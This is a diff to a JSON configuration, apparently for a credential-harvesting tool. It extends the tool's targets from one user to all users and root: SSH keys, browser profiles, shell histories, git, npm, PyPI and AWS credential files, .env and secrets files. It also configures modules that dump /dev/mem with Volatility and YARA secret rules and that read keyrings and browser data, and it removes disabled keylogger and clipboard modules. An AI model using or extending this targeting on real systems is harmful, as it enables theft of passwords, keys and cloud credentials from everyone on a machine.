@@ -4,17 +4,29 @@
       "~/.ssh/",
       "/etc/ssh/",
       "/home/*/.ssh/",
-      "/root/.ssh/"
+      "/root/.ssh/",
+      "/var/lib/*/ssh/",
+      "/opt/*/ssh/"
     ],
     "browsers": {
       "chrome": [
         "~/.config/google-chrome/Default/",
         "~/.config/chromium/Default/",
-        "~/.config/brave-browser/Default/"
+        "~/.config/brave-browser/Default/",
+        "/home/*/.config/google-chrome/Default/",
+        "/home/*/.config/chromium/Default/",
+        "/home/*/.config/brave-browser/Default/",
+        "/root/.config/google-chrome/Default/",
+        "/root/.config/chromium/Default/",
+        "/root/.config/brave-browser/Default/"
       ],
       "firefox": [
         "~/.mozilla/firefox/*.default*/",
-        "~/.mozilla/firefox/*.default-release/"
+        "~/.mozilla/firefox/*.default-release/",
+        "/home/*/.mozilla/firefox/*.default*/",
+        "/home/*/.mozilla/firefox/*.default-release/",
+        "/root/.mozilla/firefox/*.default*/",
+        "/root/.mozilla/firefox/*.default-release/"
       ]
     },
     "config_files": [
@@ -25,13 +37,42 @@
       "~/.pypirc",
       "~/.netrc",
       "~/.aws/credentials",
-      "~/.aws/config"
+      "~/.aws/config",
+      "/home/*/.bash_history",
+      "/home/*/.zsh_history",
+      "/home/*/.git-credentials",
+      "/home/*/.npmrc",
+      "/home/*/.pypirc",
+      "/home/*/.netrc",
+      "/home/*/.aws/credentials",
+      "/home/*/.aws/config",
+      "/root/.bash_history",
+      "/root/.zsh_history",
+      "/root/.git-credentials",
+      "/root/.npmrc",
+      "/root/.pypirc",
+      "/root/.netrc",
+      "/root/.aws/credentials",
+      "/root/.aws/config"
     ],
     "dotfiles": [
       "~/.env*",
       "~/.config/*/config.yml",
       "~/.config/*/secrets.json",
-      "~/.config/*/settings.json"
+      "~/.config/*/settings.json",
+      "/home/*/.env*",
+      "/home/*/.config/*/config.yml",
+      "/home/*/.config/*/secrets.json",
+      "/home/*/.config/*/settings.json",
+      "/root/.env*",
+      "/root/.config/*/config.yml",
+      "/root/.config/*/secrets.json",
+      "/root/.config/*/settings.json",
+      "/etc/environment",
+      "/etc/default/*",
+      "/var/log/*/config*",
+      "/opt/*/config*",
+      "/srv/*/config*"
     ]
   },
   "patterns": {
@@ -139,39 +180,6 @@
       "dependencies": [],
       "retry_on_failure": false
     },
-    "browser": {
-      "enabled": true,
-      "priority": 4,
-      "timeout": 180,
-      "parallel_safe": false,
-      "requires_privileges": false,
-      "estimated_time": "medium",
-      "resource_intensive": true,
-      "dependencies": [],
-      "retry_on_failure": true
-    },
-    "keyring": {
-      "enabled": true,
-      "priority": 6,
-      "timeout": 300,
-      "parallel_safe": false,
-      "requires_privileges": false,
-      "estimated_time": "slow",
-      "resource_intensive": false,
-      "dependencies": [],
-      "retry_on_failure": true
-    },
-    "memory": {
-      "enabled": true,
-      "priority": 5,
-      "timeout": 600,
-      "parallel_safe": true,
-      "requires_privileges": true,
-      "estimated_time": "slow",
-      "resource_intensive": true,
-      "dependencies": [],
-      "retry_on_failure": false
-    },
     "dotfiles": {
       "enabled": true,
       "priority": 2,
@@ -191,30 +199,52 @@
       "requires_privileges": false,
       "estimated_time": "fast",
       "resource_intensive": false,
-      "dependencies": [],
+      "dependencies": ["ssh", "dotfiles"],
       "retry_on_failure": false
     },
-    "keylogger": {
-      "enabled": false,
-      "priority": 7,
-      "timeout": 300,
+    "browser": {
+      "enabled": true,
+      "priority": 4,
+      "timeout": 180,
       "parallel_safe": false,
       "requires_privileges": false,
       "estimated_time": "medium",
-      "resource_intensive": false,
-      "dependencies": [],
-      "retry_on_failure": false
+      "resource_intensive": true,
+      "dependencies": ["history"],
+      "retry_on_failure": true
     },
-    "clipboard": {
-      "enabled": false,
-      "priority": 8,
-      "timeout": 60,
+    "memory": {
+      "enabled": true,
+      "priority": 5,
+      "timeout": 600,
+      "parallel_safe": true,
+      "requires_privileges": true,
+      "estimated_time": "slow",
+      "resource_intensive": true,
+      "dependencies": ["browser"],
+      "retry_on_failure": false,
+      "memory_dump_path": "/dev/mem",
+      "volatility_plugins": [
+        "linux_envars",
+        "linux_cmdline",
+        "linux_bash",
+        "linux_strings",
+        "linux_yarascan",
+        "linux_pslist"
+      ],
+      "volatility_profile": "Linux",
+      "yara_rules_path": "rules/secrets.yar"
+    },
+    "keyring": {
+      "enabled": true,
+      "priority": 6,
+      "timeout": 300,
       "parallel_safe": false,
       "requires_privileges": false,
-      "estimated_time": "fast",
+      "estimated_time": "slow",
       "resource_intensive": false,
-      "dependencies": [],
-      "retry_on_failure": false
+      "dependencies": ["memory"],
+      "retry_on_failure": true
     }
   },
   "performance": {
